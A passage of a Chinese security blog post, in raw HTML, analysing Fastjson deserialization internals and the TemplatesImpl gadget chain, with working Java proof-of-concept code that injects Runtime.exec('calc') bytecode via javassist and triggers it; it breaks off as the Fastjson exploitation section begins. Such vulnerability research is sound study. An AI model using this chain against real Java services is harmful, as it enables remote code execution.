class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        People people=<span class="keyword">new</span> <span class="title class_">People</span>();</span><br><span class="line">        <span class="comment">//第一种方式</span></span><br><span class="line">        String parse=<span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;李四\&quot;&#125;&quot;</span>;</span><br><span class="line">        Object parfj=JSON.parseObject(parse,People.class);</span><br><span class="line">        System.out.println(parfj);</span><br><span class="line">        <span class="comment">//第二种方式效果同上</span></span><br><span class="line">        String parse2=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.test.fastjson.People\&quot;,\&quot;name\&quot;:\&quot;李四\&quot;&#125;&quot;</span>;</span><br><span class="line">        Object parfj2=JSON.parseObject(parse2);</span><br><span class="line">        System.out.println(parfj2);</span><br><span class="line">        <span class="comment">//第三种方式</span></span><br><span class="line">        String parse2=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.test.fastjson.People\&quot;,\&quot;name\&quot;:\&quot;李四\&quot;&#125;&quot;</span>;</span><br><span class="line">        Object parfj2=JSON.parse(parse2);</span><br><span class="line">        System.out.println(parfj2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be047/fj1-3.png" title="反序列化的使用"></p><ul><li>parseObject()方法，需要设置第二个参数(Class class)将序列化数据读取应用到对应类里，否则会返回JSON对象</li><li>parse()方法是直接将序列化数据应用到@type声明的类中，如果不声明@type变量，则会返回JSON对象。</li><li>parseArray()方法就是源数据是集合的形式（即[]中的内容）</li></ul><p>另外一些使用方法直接参考中文手册即可<br><a href="https://www.w3cschool.cn/fastjson/">https://www.w3cschool.cn/fastjson/</a></p><h2 id="getter-x2F-setter自动调用"><a href="#getter-x2F-setter自动调用" class="headerlink" title="getter&#x2F;setter自动调用"></a>getter&#x2F;setter自动调用</h2><p>在使用fastjson中，发现</p><ul><li><code>JSON.parseObject(parse2)</code>方法会自动调用目标类的构造方法、get方法和set方法。</li><li><code>JSON.parseObject(parse2,People.class)</code>和<code>JSON.parse(parse2)</code>方法只会调用目标类的构造方法和set方法</li></ul><h3 id="get方法调用"><a href="#get方法调用" class="headerlink" title="get方法调用"></a>get方法调用</h3><p><code>parseObject(parse2)</code>方法中会通过反射读取目标元素的getter获取值并存储在hashmap中<br><img src="/posts/ad3be047/fj1-8.png" title="parseObject方法"><br><img src="/posts/ad3be047/fj1-4.png" title="get方法调用"><br><img src="/posts/ad3be047/fj1-5.png" title="get方法调用"><br><img src="/posts/ad3be047/fj1-9.png" title="get方法调用"><br><img src="/posts/ad3be047/fj1-6.png" title="get方法调用"></p><h3 id="set方法、构造方法调用"><a href="#set方法、构造方法调用" class="headerlink" title="set方法、构造方法调用"></a>set方法、构造方法调用</h3><p>但在setter调用的调试中，只追到下图的包，通过deserialze()方法反射获取成员值，循环读取但是无法抓到每个获取方法的过程<br><img src="/posts/ad3be047/fj1-7.png" title="setter"></p><h3 id="getter-x2F-setter获取"><a href="#getter-x2F-setter获取" class="headerlink" title="getter&#x2F;setter获取"></a>getter&#x2F;setter获取</h3><p>上面提到在调用对应get或者set方法时，通过getter&#x2F;setter获取对应方法，然后直接调用在getter&#x2F;setter获取对应的成员值反序列化中的获取getter&#x2F;setter前的调用栈大体如下，没找到前面调用过程的文章，瞎跟了好一会，比较容易跟丢，后面按我理解跟出来的调用情况，用图展示的话拉的比较长，就用调用链形式展示，以反序列化调试展示</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JSON.parseObject(String text)</span><br><span class="line">    -&gt;parse(text)</span><br><span class="line">        -&gt;parse(text, DEFAULT_PARSER_FEATURE)</span><br><span class="line">            -&gt;DefaultJSONParser.parse()</span><br><span class="line">                -&gt;parse(Object fieldName)</span><br><span class="line">                    -&gt;parseObject(object, fieldName)</span><br><span class="line">                        -&gt;TypeUtils.loadClass(typeName, config.getDefaultClassLoader()) <span class="comment">//通过type值反射获取类</span></span><br><span class="line">                        -&gt;ParserConfig.getDeserializer(Clazz)</span><br><span class="line">                            -&gt;getDeserializer(Class&lt;?&gt; clazz, Type type)</span><br><span class="line">                                -&gt;createJavaBeanDeserializer(clazz, type)</span><br><span class="line">                                    -&gt;JavaBeanInfo.build(clazz, type, propertyNamingStrategy)</span><br></pre></td></tr></table></figure><p>进入JavaBeanInfo.build()方法查看getter&#x2F;setter的设置情况<br>首先通过反射获取Clazz类的属性、方法、构造方法<br><img src="/posts/ad3be047/fj1-10.png" title="反射调用"></p><p>获取后，先是判断构造器是否为空，如果为空，则判断该类是否是接口或者抽象类，如果是的话，然后创建JSNOcreator注解，（底层源码没注解看着还是费劲好些流程不是特别明白）</p><p><img src="/posts/ad3be047/fj1-11.png" title="构造器判断"></p><h4 id="setter构建"><a href="#setter构建" class="headerlink" title="setter构建"></a>setter构建</h4><p>经过前面的一些判断，再到下面的setter构建，循环获取反射里的方法名</p><p><img src="/posts/ad3be047/fj1-12.png" title="getter/setter构建"></p><p>会经过几个条件判断:<br>条件判断，方法名长度不能小于4</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>条件判断，方法不能是静态方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件判断，方法的返回类型必须是void类型或者返回方法本身。主要是作用筛选是不是set方法，get方法会返回字符串就符合下面的判断</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>条件判断，方法的参数个数必须为1个</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line"><span class="keyword">if</span> (types.length != <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>条件判断，方法名开头必须是set开头</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123; <span class="comment">// TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？</span></span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件判断，判断TypeUtils.compatibleWithJavaBean是否开起，compatibleWithJavaBean为false表示首字母小写</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (TypeUtils.compatibleWithJavaBean) &#123;</span><br><span class="line">    propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件判断，判断set后面的字母</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断第四个字符是否是以“_”或者“f”</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">    propertyName = methodName.substring(<span class="number">4</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">    propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">//如果不是以上情况，就判断方法名长度是否大于5并且方法名的第五个字符是否是大写</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.length() &gt;= <span class="number">5</span> &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">4</span>))) &#123;</span><br><span class="line">    propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面的筛选获取截选后的字段的属性值，如果属性值不存在或者类型为boolean类型，就对其变量名前面加上is拼接，再查询拼接后的字段的属性值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> TypeUtils.getField(clazz, propertyName, declaredFields);</span><br><span class="line"><span class="keyword">if</span> (field == <span class="literal">null</span> &amp;&amp; types[<span class="number">0</span>] == <span class="type">boolean</span>.class) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">isFieldName</span> <span class="operator">=</span> <span class="string">&quot;is&quot;</span> + Character.toUpperCase(propertyName.charAt(<span class="number">0</span>)) + propertyName.substring(<span class="number">1</span>);</span><br><span class="line">    field = TypeUtils.getField(clazz, isFieldName, declaredFields);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后将符合条件的添加入fieildList中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,</span><br><span class="line">                                         annotation, fieldAnnotation, <span class="literal">null</span>));</span><br></pre></td></tr></table></figure><p>总结必须满足的条件就是：</p><ul><li>方法名长度不能小于4</li><li>方法不能是静态方法</li><li>方法的返回类型必须是void类型或者返回方法本身</li><li>方法的参数个数必须为1个</li><li>方法名开头必须是set开头</li></ul><h4 id="getter构建"><a href="#getter构建" class="headerlink" title="getter构建"></a>getter构建</h4><p><img src="/posts/ad3be047/fj1-13.png" title="getter构建"></p><p>流程差不多<br>条件判断，方法名长度不能小于4</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>条件判断，方法不能是静态方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>条件判断，方法名必须以”get”开头，并且方法名的第四个字母必须是大写</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>))) &#123;</span><br><span class="line">    <span class="keyword">if</span> (method.getParameterTypes().length != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>条件判断，方法的返回类型必须继承（Collection、Map、AtomicBoolean、AtomicLong）四个类的其中一种</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Collection.class.isAssignableFrom(method.getReturnType()) <span class="comment">//</span></span><br><span class="line">        || Map.class.isAssignableFrom(method.getReturnType()) <span class="comment">//</span></span><br><span class="line">        || AtomicBoolean.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">        || AtomicInteger.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">        || AtomicLong.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">    ) &#123;</span><br></pre></td></tr></table></figure><p>然后把满足条件的放进fieldinfo中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, <span class="literal">null</span>, clazz, type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, annotation, <span class="literal">null</span>, <span class="literal">null</span>));</span><br></pre></td></tr></table></figure><p>接着获取方法的是否存在JSONField的注解方法，类似下图，判断该类是否存在JSONField的注解方法，并且是否可以反序列化，反序列化设置默认为true<br><img src="/posts/ad3be047/fj1-15.png" title="beaninfo"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">JSONField</span> <span class="variable">annotation</span> <span class="operator">=</span> method.getAnnotation(JSONField.class);</span><br><span class="line">    <span class="keyword">if</span> (annotation != <span class="literal">null</span> &amp;&amp; annotation.deserialize()) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (annotation != <span class="literal">null</span> &amp;&amp; annotation.name().length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        propertyName = annotation.name();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后获取字段信息，查看该注释方法名在fieildList中否存在</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">FieldInfo</span> <span class="variable">fieldInfo</span> <span class="operator">=</span> getField(fieldList, propertyName);</span><br><span class="line">    <span class="keyword">if</span> (fieldInfo != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (propertyNamingStrategy != <span class="literal">null</span>) &#123;</span><br><span class="line">        propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>满足上面条件就将信息存进fieildList中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, <span class="literal">null</span>, clazz, type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, annotation, <span class="literal">null</span>, <span class="literal">null</span>));</span><br></pre></td></tr></table></figure><p>总结必须满足的条件就是：</p><ul><li>方法名长度不能小于4</li><li>方法不能是静态方法</li><li>方法名开头必须是get开头</li><li>方法的返回类型必须继承（Collection、Map、AtomicBoolean、AtomicLong）四个类的其中一种</li></ul><p>最后通过返回javaBeanInfo将上面的fieldinfo一起放进beaninfo中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JavaBeanInfo</span>(clazz, builderClass, defaultConstructor, <span class="literal">null</span>, <span class="literal">null</span>, buildMethod, jsonType, fieldList);</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be047/fj1-14.png" title="beaninfo"></p><h1 id="0x03、TemplatesImpl知识回顾"><a href="#0x03、TemplatesImpl知识回顾" class="headerlink" title="0x03、TemplatesImpl知识回顾"></a>0x03、TemplatesImpl知识回顾</h1><p>TemplatesImpl在cc2链学习中涉及到，这里直接引用cc2分析的部分吧</p><h2 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader#defineClass"></a>ClassLoader#defineClass</h2><p>ClassLoader为类加载器，可以将字节码文件(.class文件)，通过loadClass函数加载类名，返回一个Class对象，同时ClassLoader类下面存在defineClass方法，可以将byte[]字节数组信息还原成一个Class对象，在学javassist中，了解到javassist可以动态生成字节码文件，包括了一些恶意代码文件，可进而通过ClassLoader类加载器将这些恶意的字节码文件转化为java类进行调用，达到执行恶意代码的目的</p><p>其中类加载阶段：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassLoader#loadClass（类加载，从类缓或父加载器等位置寻找类）</span><br><span class="line">    ——&gt; ClassLoader#findClass（寻找类，通过URL制定的方式加载字节码）</span><br><span class="line">        ——&gt; ClassLoader#defineClass（定义类，通过获取的字节码转换成类对象）</span><br></pre></td></tr></table></figure><p>由于ClassLoader#defineClass方法为protect修饰，因此可通过反射进行调用</p><p>简单实现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//ct.writeFile(&quot;./&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] bt=ct.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射调用ClassLoader#defineClass</span></span><br><span class="line">        Method define=ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class ,<span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        define.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Class cla=(Class)define.invoke(ClassLoader.getSystemClassLoader(),<span class="string">&quot;People2&quot;</span>,bt,<span class="number">0</span>,bt.length);</span><br><span class="line">        cla.newInstance();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be047/cc2-25.png" title="defineClass实现"></p><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>TemplatesImpl这个类简述功能就是对xsl格式文件生成的字节码转换成XSLTC模板对象，期间会处理字节码，因此重写了defineClass方法，具体描述可查看<a href="https://www.anquanke.com/post/id/247044">TemplatesImpl了解</a></p><p><img src="/posts/ad3be047/cc2-26.png" title="重写defineClass"></p><p>重写了<code>defineClass</code>方法，并且没有定义域，可以在其他类进行调用使用，而<code>ClassLoader#defineClass</code>定义域是受保护的，在很多情况中调用受限，因此这也是<code>TransletClassLoader#defineClass</code>作为很多序列化漏洞入口，而不是使用<code>ClassLoader#defineClass</code></p><p>但该<code>defineClass()</code>的调用并不会实例化，需要通过<code>newInstance()</code>进行实例化。</p><p>依次看调用情况</p><h3 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses()"></a>defineTransletClasses()</h3><p><code>defineClass</code>在<code>defineTransletClasses</code>方法中被调用</p><p><img src="/posts/ad3be047/cc2-27.png" title="defineClass调用"></p><p>其中需要的满足条件：</p><ol><li><p><code>_bytecodes</code>不能为空，为空会直接抛出异常</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>_tfactory</code>需要实例化<br>创建的<code>TransletClassLoader</code>(Translet类的加载器)对象，其中<code>_tfactory.getExternalExtensionsMap()</code>中的<code>_tfactory</code>对象为<code>TransformerFactoryImpl</code>类对象，等同于调用<code>TransformerFactoryImpl.getExternalExtensionsMap()</code>方法，但其中<code>_tfactory</code>对象初始赋值为null，直接执行会报错，因此需要将<code>_tfactory</code>进行实例化，才能调用<code>TransformerFactoryImpl.getExternalExtensionsMap()</code>方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">           AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">               <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br></pre></td></tr></table></figure><p>两种实现方法都可以实例化，第一种通过<code>TransformerFactoryImpl()</code>构造方法实现实例化对象，第二种通过反射直接实现实例化对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br></pre></td></tr></table></figure></li><li><p><code>父类需要为ABSTRACT_TRANSLET</code>类<br>通过for循环对字节文件类进行循环定义并赋值给class数组，其中会判断当前获取的字节类的父类是否为<code>ABSTRACT_TRANSLET</code>类，是的话会讲该类序号赋值给<code>_transletIndex</code>，否则不是的话会抛出异常（表意为只有存在父类为<code>ABSTRACT_TRANSLET</code>类的<code>translet</code>类才能被实例化），从而在<code>getTransletInstance</code>类中的<code>AbstractTranslet</code>实例化步骤将父类为<code>ABSTRACT_TRANSLET</code>的类进行实例化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">               _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">               <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">               <span class="comment">// Check if this is the main class</span></span><br><span class="line">               <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                   _transletIndex = i;</span><br><span class="line">               &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>_bytecodes</code>字节码需要设置为byte[][]数组，<code>_bytecodes</code>变量声明为byte[][]类型，如果直接通过javassist toBytecode()生成byte[]数组运行会报错。<br><img src="/posts/ad3be047/cc2-33.png" title="_bytecodes数组"><br><img src="/posts/ad3be047/cc2-34.png" title="_bytecodes数组"><br>因此需要将一维数组转化为二维数组。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line"><span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br></pre></td></tr></table></figure></li></ol><p>接着查看<code>defineTransletClasses</code>方法的上层调用情况<br>其中有三处对该方法进行了调用，其中只用<code>getTransletInstance</code>方法有上层调用，其他两个方法没有被其他方法进行调用。</p><p><img src="/posts/ad3be047/cc2-28.png" title="getTransletInstance调用"></p><h3 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance()"></a>getTransletInstance()</h3><p><img src="/posts/ad3be047/cc2-29.png" title="getTransletInstance调用"></p><p>其中需要的满足条件：</p><ol><li><p><code>_name</code>不能为空，为空会直接返回<code>null</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure></li><li><p><code>_class</code>必须为空，才能调用<code>defineTransletClasses</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br></pre></td></tr></table></figure></li></ol><p>最后通过创建<code>AbstractTranslet</code>对象将class文件类进行实例化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure><p>接着查看<code>getTransletInstance</code>方法的上层调用情况</p><p><img src="/posts/ad3be047/cc2-30.png" title="getTransletInstance调用"></p><p><code>newTransformer()</code>方法进行了调用</p><h3 id="newTransformer"><a href="#newTransformer" class="headerlink" title="newTransformer()"></a>newTransformer()</h3><p>在调用构造函数的时候调用了<code>getTransletInstance</code>方法，返回Translet类的实例，其中没有需要的满足条件。</p><p>接着查看<code>newTransformer()</code>方法的上层调用情况</p><p><img src="/posts/ad3be047/cc2-31.png" title="newTransformer调用"></p><p>其中有5处显示进行了调用，但只有<code>getOutputProperties</code>方法调用的本类的<code>newTransformer()</code>方法，其他四种都是调用的其他类重写的<code>newTransformer()</code>方法。</p><h3 id="getOutputProperties"><a href="#getOutputProperties" class="headerlink" title="getOutputProperties()"></a>getOutputProperties()</h3><p><img src="/posts/ad3be047/cc2-32.png" title="getOutputProperties调用"></p><p>该方法直接执行了<code>newTransforme</code>方法，没有其他条件限制，查询<code>getOutputProperties</code>的上层调用，没有在本类发现其调用，因此最后的执行方法就在<code>getOutputProperties</code></p><h3 id="完整链"><a href="#完整链" class="headerlink" title="完整链"></a>完整链</h3><p>到<code>newTransformer</code>方法执行就能达到触发了，他上层<code>getOutputProperties</code>方法也进行了调用，也可以算进去当作延伸出来的链。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getOutputProperties()</span><br><span class="line">    newTransformer()</span><br><span class="line">        getTransletInstance()</span><br><span class="line">            defineTransletClasses()</span><br><span class="line">                defineClass()</span><br></pre></td></tr></table></figure><h3 id="实现demo"><a href="#实现demo" class="headerlink" title="实现demo"></a>实现demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化，效果等同于new TransformerFactoryImpl()</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line">        <span class="comment">//执行newTransformer()方法</span></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">        <span class="comment">//执行getOutputProperties(),getOutputProperties为newTransformer上层调用，执行效果相同，就是多了个执行步骤</span></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be047/cc2-35.png" title="实现demo"></p><h1 id="0x04、fastjson-TemplatesImpl利用分析"><a href="#0x04、fastjson-TemplatesImpl利用分析" class="headerlink" 